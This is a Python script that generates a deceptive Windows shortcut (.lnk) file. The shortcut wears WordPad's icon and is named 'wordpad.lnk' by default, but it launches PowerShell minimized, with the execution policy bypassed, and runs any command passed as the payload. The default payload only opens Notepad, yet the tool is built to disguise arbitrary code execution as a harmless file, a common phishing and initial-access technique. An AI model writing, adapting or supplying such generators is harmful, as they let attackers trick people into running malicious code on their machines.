import os
import argparse
from win32com.client import Dispatch

class LnkCreator:
    def __init__(self, description="", payload="Start-Process notepad.exe", icon="C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe", output="wordpad.lnk"):
        self.description = description
        self.payload = payload
        self.icon = icon
        self.output = output

    def create_shortcut(self):
        target_path = os.path.join(os.environ["SystemRoot"], "System32", "WindowsPowerShell", "v1.0", "powershell.exe")
        arguments = f'-NoProfile -ExecutionPolicy Bypass -Command "{self.payload}"'

        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(self.output)
        shortcut.TargetPath = target_path
        shortcut.Arguments = arguments
        shortcut.Description = self.description
        shortcut.IconLocation = self.icon
        shortcut.WindowStyle = 7
        shortcut.Save()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--description', '-d', default="", help='Set description for lnk file.')
    parser.add_argument('--payload', '-p', default="Start-Process notepad.exe", help='PowerShell command to be executed.')
    parser.add_argument('--icon', '-i', default="C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe", help='Icon to be used.')
    parser.add_argument('--output', '-o', default="wordpad.lnk", help='Name of output files')

    args = parser.parse_args()

    lnk_creator = LnkCreator(description=args.description, payload=args.payload, icon=args.icon, output=args.output)
    lnk_creator.create_shortcut()

if __name__ == "__main__":
    main()
